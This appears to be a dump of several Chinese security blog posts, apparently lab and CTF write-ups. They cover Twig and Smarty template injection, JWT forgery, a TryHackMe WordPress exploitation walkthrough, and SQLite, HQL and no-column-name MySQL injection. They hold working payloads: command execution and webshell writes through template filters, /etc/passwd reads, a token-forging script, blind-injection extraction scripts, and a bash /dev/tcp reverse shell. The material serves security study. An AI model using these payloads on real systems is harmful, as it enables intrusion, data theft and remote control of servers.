2 3 4 system ( string $command [, int \u0026amp;$return_var ] ) : string passthru ( string $command [, int \u0026amp;$return_var ] ) exec ( string $command [, array \u0026amp;$output [, int \u0026amp;$return_var ]] ) : string shell_exec ( string $cmd ) : string payload\n1 2 3 {{[\u0026#34;id\u0026#34;]|map(\u0026#34;system\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|map(\u0026#34;passthru\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|map(\u0026#34;exec\u0026#34;)}} // 无回显 这样会被解析为\n1 2 3 twig_array_map([0 =\u0026gt; \u0026#34;id\u0026#34;], \u0026#34;sysetm\u0026#34;) 然后 在 twig_array_map 函数中将执行 system(\u0026#39;id\u0026#39;,0)。 如果上面这些命令执行函数都被禁用了，我们还可以执行其他函数执行任意代码：\n1 2 {{[\u0026#34;phpinfo();\u0026#34;]|map(\u0026#34;assert\u0026#34;)|join(\u0026#34;,\u0026#34;)}} {{{\u0026#34;\u0026lt;?php phpinfo();eval($_POST[whoami])\u0026#34;:\u0026#34;/var/www/html/shell.php\u0026#34;}|map(\u0026#34;file_put_contents\u0026#34;)}} // 写 Webshell sort过滤器 这个 sort 筛选器可以用来对数组排序。\n1 2 3 {% for user in users|sort %} ... {% endfor %} 传递一个箭头函数来对数组进行排序：\n1 2 3 4 5 6 7 8 9 10 11 {% set fruits = [ { name: \u0026#39;Apples\u0026#39;, quantity: 5 }, { name: \u0026#39;Oranges\u0026#39;, quantity: 2 }, { name: \u0026#39;Grapes\u0026#39;, quantity: 4 }, ] %} {% for fruit in fruits|sort((a, b) =\u0026gt; a.quantity \u0026lt;=\u0026gt; b.quantity)|column(\u0026#39;name\u0026#39;) %} {{ fruit }} {% endfor %} // Output in this order: Oranges, Grapes, Apples 类似于 map，模板编译的过程中会进入 twig_sort_filter 函数，这个 twig_sort_filter 函数的源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function twig_sort_filter($array, $arrow = null) { if ($array instanceof \\Traversable) { $array = iterator_to_array($array); } elseif (!\\is_array($array)) { throw new RuntimeError(sprintf(\u0026#39;The sort filter only works with arrays or \u0026#34;Traversable\u0026#34;, got \u0026#34;%s\u0026#34;.\u0026#39;, \\gettype($array))); } if (null !== $arrow) { uasort($array, $arrow); // 直接被 uasort 调用 } else { asort($array); } return $array; } 从源码中可以看到，$array 和 $arrow 直接被 uasort 函数调用。众所周知 uasort 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：\n1 2 3 php \u0026gt; $arr = [\u0026#34;id\u0026#34;,0]; php \u0026gt; usort($arr,\u0026#34;system\u0026#34;); //uid=0(root) gid=0(root) groups=0(root) payload\n1 2 3 {{[\u0026#34;id\u0026#34;, 0]|sort(\u0026#34;system\u0026#34;)}} {{[\u0026#34;id\u0026#34;, 0]|sort(\u0026#34;passthru\u0026#34;)}} {{[\u0026#34;id\u0026#34;, 0]|sort(\u0026#34;exec\u0026#34;)}} // 无回显 filter过滤器 这个 filter 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：\n1 2 3 4 {% set lists = [34, 36, 38, 40, 42] %} {{ lists|filter(v =\u0026gt; v \u0026gt; 38)|join(\u0026#39;, \u0026#39;) }} // Output: 40, 42 类似于 map，模板编译的过程中会进入 twig_array_filter 函数，这个 twig_array_filter 函数的源码如下：\n1 2 3 4 5 6 7 8 9 function twig_array_filter($array, $arrow) { if (\\is_array($array)) { return array_filter($array, $arrow, \\ARRAY_FILTER_USE_BOTH); // $array 和 $arrow 直接被 array_filter 函数调用 } // the IteratorIterator wrapping is needed as some internal PHP classes are \\Traversable but do not implement \\Iterator return new \\CallbackFilterIterator(new \\IteratorIterator($array), $arrow); } 从源码中可以看到，$array 和 $arrow 直接被 array_filter 函数调用。 array_filter 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：\n1 2 3 php \u0026gt; $arr = [\u0026#34;id\u0026#34;]; php \u0026gt; array_filter($arr,\u0026#34;system\u0026#34;); //uid=0(root) gid=0(root) groups=0(root) payload\n1 2 3 {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;system\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;passthru\u0026#34;)}} {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;exec\u0026#34;)}} // 无回显 reduce 过滤器 这个 reduce 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：\n1 2 3 {% set numbers = [1, 2, 3] %} {{ numbers|reduce((carry, v) =\u0026gt; carry + v) }} // Output: 6 类似于 map，模板编译的过程中会进入 twig_array_reduce 函数，这个 twig_array_reduce 函数的源码如下：\n1 2 3 4 5 6 7 8 function twig_array_reduce($array, $arrow, $initial = null) { if (!\\is_array($array)) { $array = iterator_to_array($array); } return array_reduce($array, $arrow, $initial); // $array, $arrow 和 $initial 直接被 array_reduce 函数调用 }\t从源码中可以看到，$array 和 $arrow 直接被 array_filter 函数调用。 array_reduce 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。\npayload\n1 2 3 {{[0, 0]|reduce(\u0026#34;system\u0026#34;, \u0026#34;id\u0026#34;)}} {{[0, 0]|reduce(\u0026#34;passthru\u0026#34;, \u0026#34;id\u0026#34;)}} {{[0, 0]|reduce(\u0026#34;exec\u0026#34;, \u0026#34;id\u0026#34;)}} // 无回显 smarty $smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法\nsmarty/libs/sysplugins/smarty_internal_data.php　——\u0026gt;　getStreamVariable() 这个方法可以获取传入变量的流\n因此我们可以用这个方法读文件，payload:\n1 {self::getStreamVariable(\u0026#34;file:///etc/passwd\u0026#34;)} smarty/libs/sysplugins/smarty_internal_write_file.php　——\u0026gt;　Smarty_Internal_Write_File 这个类中有一个writeFile方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 class Smarty_Internal_Write_File { /** * Writes file in a safe way to disk * * @param string $_filepath complete filepath * @param string $_contents file content * @param Smarty $smarty smarty instance * * @throws SmartyException * @return boolean true */ public function writeFile($_filepath, $_contents, Smarty $smarty) { $_error_reporting = error_reporting(); error_reporting($_error_reporting \u0026amp; ~E_NOTICE \u0026amp; ~E_WARNING); if ($smarty-\u0026gt;_file_perms !== null) { $old_umask = umask(0); } $_dirpath = dirname($_filepath); // if subdirs, create dir structure if ($_dirpath !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; !file_exists($_dirpath)) { mkdir($_dirpath, $smarty-\u0026gt;_dir_perms === null ? 0777 : $smarty-\u0026gt;_dir_perms, true); } // write to tmp file, then move to overt file lock race condition $_tmp_file = $_dirpath . DS . str_replace(array(\u0026#39;.\u0026#39;, \u0026#39;,\u0026#39;), \u0026#39;_\u0026#39;, uniqid(\u0026#39;wrt\u0026#39;, true)); if (!file_put_contents($_tmp_file, $_contents)) { error_reporting($_error_reporting); throw new SmartyException(\u0026#34;unable to write file {$_tmp_file}\u0026#34;); } /* * Windows\u0026#39; rename() fails if the destination exists, * Linux\u0026#39; rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux\u0026#39; rename() * seems to be smart enough to handle that for us. */ if (Smarty::$_IS_WINDOWS) { // remove original file if (is_file($_filepath)) { @unlink($_filepath); } // rename tmp file $success = @rename($_tmp_file, $_filepath); } else { // rename tmp file $success = @rename($_tmp_file, $_filepath); if (!$success) { // remove original file if (is_file($_filepath)) { @unlink($_filepath); } // rename tmp file $success = @rename($_tmp_file, $_filepath); } } if (!$success) { error_reporting($_error_reporting); throw new SmartyException(\u0026#34;unable to write file {$_filepath}\u0026#34;); } if ($smarty-\u0026gt;_file_perms !== null) { // set file permissions chmod($_filepath, $smarty-\u0026gt;_file_perms); umask($old_umask); } error_reporting($_error_reporting); return true; } } 可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：\n1 2 3 4 public function clearConfig($varname = null) { return Smarty_Internal_Extension_Config::clearConfig($this, $varname); } payload写入webshell\n1 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\u0026#34;\u0026lt;?php eval($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34;,self::clearConfig())} ssti 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1. {$smarty.version} {$smarty.version} #获取smarty的版本号 2. {php}{/php} {php}phpinfo();{/php} #执行相应的php代码 在Smarty3版本中已经废弃{php}标签，强烈建议不要使用 3. {literal} \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;phpinfo();\u0026lt;/script\u0026gt; 这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。但是这种写法只适用于php5环境 4. getstreamvariable {self::getStreamVariable(\u0026#34;file:///etc/passwd\u0026#34;)} 这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。所以上面介绍的旧版本payload几乎没用 5. {if}{/if} {if phpinfo()}{/if} Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，\u0026amp;\u0026amp;，and，is_array()等等 ","date":"2025-01-06T00:00:00Z","image":"https://0d000721999.github.io/p/php%E4%B8%8B%E7%9A%84sstitwig%E5%92%8Csmarty/1.png","permalink":"https://0d000721999.github.io/p/php%E4%B8%8B%E7%9A%84sstitwig%E5%92%8Csmarty/","title":"php下的SSTI(twig和smarty)"},{"content":"JWT JWT(英文全称：JSON Web Token) 是一个开放标准（RFC 7519），用于在双方之间安全地表示声明。一种无状态的认证机制,通常用于授权和信息交换。 是目前最流行的跨域认证解决方案。\nauthlab靶场 从安全性的角度来看，至少存在两个潜在的问题。 1、缺乏机密性-我们能够轻松解码有效载荷payload（和报头header）。 2、用户插入另一个操作（例如删除）并绕过授权\nLeaky_JWT 靶场：https://authlab.digi.ninja/Leaky_JWT\n给了jwt加密的一串base64\n去掉前后点的内容，解码payload\n密码还进行MD5加密了\nJWT_None 靶场：https://authlab.digi.ninja/JWT_None\nbp抓包，插件json web token attack可以看到解码后的\n用在线网站base64加密可以更改payload\n把后面的签名验证去掉，前面签名加密方式改为None\n就完成越权\n漏洞攻击思路 攻击思路 首先找到需要JWT鉴权后才能访问的页面，如个人资料页面，将该请求包重放测试： 1）未授权访问：删除Token后仍然可以正常响应对应页面 2）敏感信息泄露：通过JWt.io解密出Payload后查看其中是否包含敏感信息，如弱加密的密码等 3）破解密钥+越权访问：通过JWT.io解密出Payload部分内容，通过空加密算法或密钥爆破等方式实现重新签发Token并修改Payload部分内容，重放请求包，观察响应包是否能够越权查看其他用户资料\n4）检查Token时效性：解密查看payload中是否有exp字段键值对（Token过期时间），等待过期时间后再次使用该Token发送请求，若正常响应则存在Token不过期 5）通过页面回显进行探测：如修改Payload中键值对后页面报错信息是否存在注入，payload中kid字段的目录遍历问题与sql注入问题\nJWT漏洞利用工具 1、jwt_tool（git clone https://github.com/ticarpi/jwt_tool） 可以用来验证、伪造和破解JWT令牌。\n安装\n1、git clone https://github.com/ticarpi/jwt_tool\n2、pip install pycryptodomex\n3、cd到安装目录\n4、解密\npython jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicm9iaW4iLCJsZXZlbCI6InVzZXIifQ.oYPuxIPnm6lYx3Zx_8zaMGVw7Np5nZtgJVnaMqlZcOQ\n2、jwt-cracker 该工具仅限于单一的签名算法(HS256) ，如果提供了不同的签名算法，则无法进行操作 https://github.com/lmammino/jwt-cracker\n3、c-jwt-cracker 同样是暴力破解 JWT 私钥的工具。 https://github.com/brendan-rius/c-jwt-cracker\n1、使用c-jwt-cracker需要我们在我们linux里安装好openssl头文件。\n在linux的配置命令是：apt-get install libssl-dev\n2、下载好c-jwt-cracker，还需要我么在工具所在目录执行make命令。目的是让文件makefile运行起来。编译完后会生成一个jwtcrack文件。\n1 2 3 sudo apt-get update sudo apt-get install libssl-dev make ctfhub 敏感信息泄露 bp抓包然后丢给jwt_tool爆破出flag\n无签名 bp抓包到repeater，改加密方式为none，role=\u0026ldquo;admin\u0026rdquo;，然后转编码到token\n跟上面JWT_None一个思路\n注意这里是none不是None。\n修改签名算法 抓包是RS256加密\n要改成HS256对称加密\n题目给了publickey.pem\n所以我们用脚本生成改为HS256的token\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #coding=utf-8 import hmac import hashlib import base64 file = open(\u0026#39;publickey.pem\u0026#39;) #需要将文中的publickey下载 与脚本同目录 key = file.read() #Paste your header and payload here header = \u0026#39;{\u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;HS256\u0026#34;}\u0026#39; payload = \u0026#39;{\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34;}\u0026#39; #Creating encoded header encodeHBytes = base64.urlsafe_b64encode(header.encode(\u0026#34;utf-8\u0026#34;)) encodeHeader = str(encodeHBytes, \u0026#34;utf-8\u0026#34;).rstrip(\u0026#34;=\u0026#34;) #Creating encoded payload encodePBytes = base64.urlsafe_b64encode(payload.encode(\u0026#34;utf-8\u0026#34;)) encodePayload = str(encodePBytes, \u0026#34;utf-8\u0026#34;).rstrip(\u0026#34;=\u0026#34;) #Concatenating header and payload token = (encodeHeader + \u0026#34;.\u0026#34; + encodePayload) #Creating signature sig = base64.urlsafe_b64encode(hmac.new(bytes(key, \u0026#34;UTF-8\u0026#34;), token.encode(\u0026#34;utf-8\u0026#34;), hashlib.sha256).digest()).decode(\u0026#34;UTF-8\u0026#34;).rstrip(\u0026#34;=\u0026#34;) print(token + \u0026#34;.\u0026#34; + sig) 生成后丢进bp里面改token就得到flag。\n弱密钥 抓包拿token,然后用c-jwt-cracker爆破密钥\n密钥是irty\n改role为admin\nbp改token出flag\n","date":"2024-12-23T00:00:00Z","image":"https://0d000721999.github.io/p/jwt/1.png","permalink":"https://0d000721999.github.io/p/jwt/","title":"JWT"},{"content":"thm日记 TryHack3M: Bricks Heist 先在etc/hosts下面写入bricks.thm的ip\n1 2 3 cd /etc echo \u0026#34;10.10.182.111 bricks.thm\u0026#34; \u0026gt;\u0026gt;hosts cat hosts 然后nmap扫端口\n1 nmap -sV bricks.thm 22,80,443,3306端口开放\n进入界面发现是WordPress\n用wpscan扫描\n1 wpscan --url https://bricks.thm --disable-tls-checks wordpress bricks 1.9.5\n有一个cve:CVE-2024-25600\nhttps://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT\n1 wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py 1 python3 CVE-2024-25600.py -u https://bricks.thm 拿到shell\n1 cat 650c844110baced87e1606453b93f22a.txt 查看可疑进程\n1 systemctl | grep running 下面这个就可以知道可以进程的名称\n1 systemctl status ubuntu.service 用前下的shell进行nc监听反弹shell\n1 bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/ip/port \u0026lt;\u0026amp;1\u0026#39; 前下知道进程名称为nm-inet-dialog\n下面有他的目录\n1 ls -la 发现inet.conf文件\n1 head inet.conf 回显一串16进制字符，双层base64解密后得到字符串\n去blockchain官网\n1 bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa\n复制钱的来源\n1 bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r https://ofac.treasury.gov/recent-actions/20240220\n这里找到它们的组织是LockBit\n","date":"2024-12-11T00:00:00Z","image":"https://0d000721999.github.io/p/thm%E6%97%A5%E8%AE%B0/1.png","permalink":"https://0d000721999.github.io/p/thm%E6%97%A5%E8%AE%B0/","title":"thm日记"},{"content":"sqlite注入 语法 1 2 3 4 5 .help 获取可用的点命令的清单 .show 显示各种设置的当前值 .quite 退出SQLite 提示符 .databases 列出数据库的名称及其所依附的文件 .schema ?TABLE? 显示 CREATE 语句,例如.schema sqlite_master 数据库操作 SQLite 的 sqlite3 命令被用来创建新的 SQLite 数据库。您不需要任何特殊的权限即可创建一个数据。 另外我们也可以使用 .open 来建立新的数据库文件：\n1 2 3 4 5 6 sqlite3 dbname.db SQLite version 3.32.3 2020-06-18 14:16:19 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .databases main: /Users/ye1s/Desktop/work/dbname.db sqlite\u0026gt; .open test.db SQLite可以附加数据库，假设这样一种情况，当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库。\n例如想附加一个数据库 testDB.db。\n1 2 3 4 sqlite\u0026gt; ATTACH DATABASE \u0026#39;testDB.db\u0026#39; as \u0026#39;TEST\u0026#39;; sqlite\u0026gt; .databases main: /Users/ye1s/Desktop/work/dbname.db TEST: /Users/ye1s/Desktop/work/testDB.db 表操作 CREATE TABLE 语句用来创建一个新表，.tables查看创建的表， .schema 可查看表的完整信息，INSERT INTO 向表中添加信息，drop table 删除表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 sqlite\u0026gt; CREATE TABLE USERS( ...\u0026gt; ID INT PRIMARY KEY NOT NULL, ...\u0026gt; USERNAME TEXT NOT NULL, ...\u0026gt; PASSWORD TEXT NOT NULL ...\u0026gt; ); sqlite\u0026gt; .tables USERS sqlite\u0026gt; .schema users CREATE TABLE USERS( ID INT PRIMARY KEY NOT NULL, USERNAME TEXT NOT NULL, PASSWORD TEXT NOT NULL ); ​ sqlite\u0026gt; INSERT INTO users (id,username,password) VALUES (1, \u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;); ​ sqlite\u0026gt; select * from users; 1|admin|password ​ sqlite\u0026gt; .header on sqlite\u0026gt; .mode column sqlite\u0026gt; select * from users; ID USERNAME PASSWORD ---------- ---------- ---------- 1 admin password ​ sqlite\u0026gt; drop table users; sqlite\u0026gt; .tables sqlite注入 SQLite相关注意点：\n1.SQLite_master:这个是内置系统表、相当于mysql的information_schema，但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型。\n2.SQLite并不支持像mysql那样的注释，但是可以通过 - 方式增加DDL注释(写shell会用到)SQL，并扩展至下一个换行符（ASCII 0x0a）或直到输入结束，以先到者为准。您也可以使用 C 风格的注释，以 /*开始，并扩展至下一个 */字符对或直到输入结束，以先到者为准。SQLite的注释可以跨越多行。\n联合查询 闭合语句\n1 2 3 1\u0026#39;; 1\u0026#39; -- 1\u0026#39; /* 1 2 3 4 5 1\u0026#39; order by 5 -- -1\u0026#39; union select 1,2,3 -- -1\u0026#39; union select 1,2,sqlite_version() -- -1\u0026#39; union select 1, (select sql from sqlite_master) ,3-- -1\u0026#39; union select 1, (select group_concat(USERNAME,PASSWORD) from users) ,3-- 布尔盲注 布尔盲注通过查询正确和错误返回的页面不同来判断数据内容。 SQLite不支持ascii，所以直接通过字符去查询，这里和mysql不同，这个区分大小写。也没有mid,left等函数。\n1 -1\u0026#39; or substr((select group_concat(sql) from sqlite_master),1,1)\u0026lt;\u0026#39;a\u0026#39;/* 注入脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import requests url = \u0026#39;http://localhost:9000/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,500): low = 32 high = 128 mid = (low+high)//2 while(low\u0026lt;high): payload = \u0026#34;-1\u0026#39; or substr((select hex(group_concat(sql)) from sqlite_master),{0},1)\u0026gt;\u0026#39;{1}\u0026#39;/*\u0026#34;.format(i,chr(mid)) datas = { \u0026#34;id\u0026#34;: payload } res = requests.post(url=url,data=datas) ​ if \u0026#39;Username\u0026#39; in res.text: low = mid+1 else: high = mid mid = (low+high)//2 if(mid ==32 or mid ==127): break flag = flag+chr(mid) print(flag) ​\tprint(\u0026#39;\\n\u0026#39;+bytes.fromhex(flag).decode(\u0026#39;utf-8\u0026#39;)) 时间盲注 SQLite没有sleep()函数，但可以用randomblob(N)函数，randomblob(N) 函数，其作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。SQLite没有if，所以需要使用case……when来代替。\n1 -1\u0026#39; or (case when(substr(sqlite_version(),1,1)\u0026gt;\u0026#39;3\u0026#39;) then randomblob(300000000) else 0 end)/* 脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import requests import time url = \u0026#39;http://localhost:9000/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,500): low = 32 high = 128 mid = (low+high)//2 while(low\u0026lt;high): payload = \u0026#34;-1\u0026#39; or (case when(substr((select hex(group_concat(sql)) from sqlite_master),{0},1)\u0026gt;\u0026#39;{1}\u0026#39;) then randomblob(300000000) else 0 end)/*\u0026#34;.format(i,chr(mid)) datas = { \u0026#34;id\u0026#34;: payload } start_time=time.time() res = requests.post(url=url,data=datas) end_time=time.time() spend_time=end_time-start_time if spend_time\u0026gt;=2: low = mid+1 else: high = mid mid = (low+high)//2 if(mid ==32 or mid ==127): break flag = flag+chr(mid) print(flag) ​ print(\u0026#39;\\n\u0026#39;+bytes.fromhex(flag).decode(\u0026#39;utf-8\u0026#39;)) 写入webshell SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行。\n1 ATTACH DATABASE file_name AS database_name; 如果附加数据库不存在，就会创建该数据库，如果数据库文件设置在web目录下，就可以写入webshell。\n1 2 3 ATTACH DATABASE \u0026#39;/var/www/html/shell.php\u0026#39; AS shell; create TABLE shell.exp (webshell text); insert INTO shell.exp (webshell) VALUES (\u0026#39;\u0026lt;?php eval($_POST[a]);?\u0026gt;\u0026#39;); 示例代码使用的是 query() 函数来执行 SQL 语句，此时无法执行分号隔离的多条语句。可以将 query() 换成 exec()，可造成堆叠注入，就可以写 Webshell 了，exec()函数执行后没有回显。执行如下语句：\n1 2 3 1\u0026#39;;ATTACH DATABASE \u0026#39;/var/www/html/shell.php\u0026#39; AS shell; create TABLE shell.exp (webshell text); insert INTO shell.exp (webshell) VALUES (\u0026#39;\u0026lt;?php eval($_POST[a]);?\u0026gt;\u0026#39;); /* ","date":"2024-11-28T00:00:00Z","image":"https://0d000721999.github.io/p/sqlite%E6%B3%A8%E5%85%A5/1.png","permalink":"https://0d000721999.github.io/p/sqlite%E6%B3%A8%E5%85%A5/","title":"sqlite注入"},{"content":"HQL注入（Hibernate框架） Hibernate是一种ORM框架，它是支持使用原生SQL或HQL语言(Hibernate框架自己的语言)进行SQL操作的\n通常使用Hibernate框架都是使用HQL语言方式进行查询\n1、原生SQL语句\n1 2 3 String parameter = req.getParameter(\u0026#34;name\u0026#34;); Query query = session.createSQLQuery(\u0026#34;SELECT table_name FROM information_schema.tables where table_schema=?\u0026#34;); query.setParameter(1, parameter); 2、HQL语句\n将数据库tables映射为相关的类，通过此类进行数据查询，使用的是HQL自己的语言\n1 2 3 String parameter = req.getParameter(\u0026#34;name\u0026#34;); Query query = session.createQuery(\u0026#34;from com.demo.bean.User where tableschema = ?1\u0026#34;, User.class); query.setParameter(1, parameter); 1、Hibernate框架首先会去解析createQuery()函数中语句是否符合HQL语法，不符合则会HQL语法错误\n2、符合HQL语法后，HQL框架会将语句解析成对应数据库的原生SQL语句\n3、最后将原生SQL语句去数据库中进行查询获取结果，此时原生SQL语句如果不正确则会导致数据库层面的报错（不同数据库则是不同的报错了）\n1 2 3 1、information_schema.tables表名映射为com.demo.bean.User类 2、table_name字段映射为tablename 3、table_schema字段映射为tableschema 简单HQL层面注入 union查询在5.6.15版本之前不支持\n1 name=mysql\u0026#39; union select 1,\u0026#39;2 #报错 6.x版本开始支持union查询，但是也只能利用HQL语法\n1 name=mysql\u0026#39; union from User where \u0026#39;1\u0026#39;=\u0026#39;1 不能使用单行注释#或+--+\n1 2 3 ?name=mysql\u0026#39;and/**/\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;+--+ #报错 ?name=mysql\u0026#39;and/**/\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# #报错 ?name=mysql\u0026#39;and#%0d%0a\u0026#39;1\u0026#39;=\u0026#39;1 #报错 不支持*查询\n1 ?name=mysql\u0026#39; and (select * from User where tablename=\u0026#39;user\u0026#39;)=\u0026#39;user 怎么查询：\n1、如果有报错信息的话，那就根据报错回显去看表名、列名，根据表名进行盲注或报错注入查询数据。或者根据回显去猜测可能存在的表名和列名，然后进行查询数据\n2、如果没有报错信息的话\n使用and或or进行列名的枚举\n1 ?name=mysql\u0026#39; and xxxxx = \u0026#39;1 使用子查询进行表名枚举\n1 ?name=mysql\u0026#39;or+(select+1+from+XXXX+where+1=2)=\u0026#39;1 HQL注入的常见类型可以总结为两种：布尔盲注和报错注入。\nHQL注入需要两次or\n逃逸HQL层面注入 低于5.x版本逃逸 1、在5.6.15之前，WHERE子句中是可以使用用户自定义函数的，这就说明数据库本身的函数也是可以使用的\n1 2 updatexml() version() 2、在5.6.15版本之前，存在着对单引号转义的差异导致的逃逸问题\n在HQL语言，字符串和常规SQL语句一样都是使用单引号包裹\n1 from Tables where name = \u0026#39;mysql\u0026#39; 引擎是不会对字符串里面的内容进行解析的\n当在字符串中加入一个转译字符\n1 from Tables where name = \u0026#39;mysql\\\u0026#39; HQL引擎是不识别转译字符\\的，它会将tony\\作为一个字符串，原封不动的转为mysql语句\n此处就导致了一个差异，mysql是识别转译字符的，所以爆了语法错误\n然后利用这个差异，构造一个HQL以为是字符串，但转为mysql变成语句的POC即可\n1 mysql\\\u0026#39;\u0026#39;and+1=2+union+select+user(),version()# 拼接HQL语句，此时mysql\\''and+1=2+union+select+user(),version()#是一整个字符串，所以引擎不去解析\n1 from Tables where name = \u0026#39;mysql\\\u0026#39;\u0026#39;and+1=2+union+select+user(),version()#\u0026#39; 转为sql语句，这样就在低于5.x的版本实现用union进行注入\n高于6.x 版本逃逸 1、从6.0.1.Final版本开始，测试发现转译符\\失效\n所以无法用\\来逃逸\n2、在6.x版本中发现新增了一个sql()函数，在5.x版本是不支持的\n意思就是可以执行SQL语句，主要是两种方式\n1 2 sql(\u0026#39;select 1,2,3\u0026#39;) sql(\u0026#39;select 1,2,?\u0026#39;,\u0026#39;3\u0026#39;) 1、第一种是将函数里面的字符串直接拼接SQL语句中，然后去执行\n2、第二种就是将后面参数预编译替换占位符?，然后再拼接到SQL语句中执行\n1 ?name=mysql\u0026#39; and sql(\u0026#39;1=2 union select table_name,table_schema from information_schema.tables#\u0026#39;)=\u0026#39;1 通用版本逃逸 有一个函数在5.x和6.x都能使用，那就是JPQL语言的function()函数\n在Hibernate框架中是同时支持JPQL语言和HQL语言的\nfunction()函数是用来调用自定义函数或数据库自带函数的，和某些动态函数调用差不多吧\n1 2 3 4 function(\u0026#39;version\u0026#39;) =\u0026gt; version() function(\u0026#39;updatexml\u0026#39;,1,1,1) =\u0026gt; updatexml(1,1,1) function(\u0026#39;aaaa\u0026#39;\u0026#39;bbbb\u0026#39;,1,1,1) =\u0026gt; aaaa\u0026#39;\u0026#39;bbbb(1,1,1) 5.x版本 function(\u0026#39;aaaa\u0026#39;\u0026#39;bbbb\u0026#39;,1,1,1) =\u0026gt; aaaa\u0026#39;bbbb(1,1,1) 6.x版本 它首先将第一参数作为函数名，随后拼接一个括号，后面的参数则是括号里的内容\n而function()函数的利用和sql()函数一样，是直接拼接在解析后的SQL语句中的，而且第一参数的内容没有任何限制\n这样就可以构造一个可利用POC了\n1 ?name=mysql\u0026#39; and function(\u0026#39;1=2 union select table_name,table_schema from information_schema.tables#\u0026#39;)=\u0026#39; ","date":"2024-11-08T00:00:00Z","image":"https://0d000721999.github.io/p/hql%E6%B3%A8%E5%85%A5/1.jpg","permalink":"https://0d000721999.github.io/p/hql%E6%B3%A8%E5%85%A5/","title":"HQL注入"},{"content":"无列名注入 sql注入一般都会用到information_schema这个库（mysql自带的库），所以ban掉这个表是一个很好的防御手段，这时候就可以使用无列名注入来绕过。\nInnoDb引擎 mysql 5.5.8之后开始使用InnoDb作为默认引擎，mysql 5.6的InnoDb增加了innodb_index_stats和innodb_table_stats两张表\n这两张表记录了数据库和表的信息，但是没有列名\n1 2 select group_concat(database_name) from mysql.innodb_index_stats; select group_concat(table_name) from mysql.innodb_table_stats where database_name=database() sys库 MySQL 5.7开始增加了sys库，这个库可以用于快速了解系统元数据信息。sys库通过视图的形式把information_schema和performance_schema结合起来，查询令人容易理解的数据。\nsys.schema_auto_increment_columns 这个视图用于保存有自增字段的数据库信息，一般设计表时都会设置自增字段（如id）\n1 2 3 4 #查询数据库名 select table_schema from sys.schema_auto_increment_columns #查询表名 select table_name from sys.schema_auto_increment_columns where table_schema=databse() schema_table_statistics_with_buffer 不存在自增字段时使用schema_table_statistics_with_buffer\n1 2 3 4 5 6 # 查询数据库 select table_schema from sys.schema_table_statistics_with_buffer; select table_schema from sys.x$schema_table_statistics_with_buffer; # 查询指定数据库的表 select table_name from 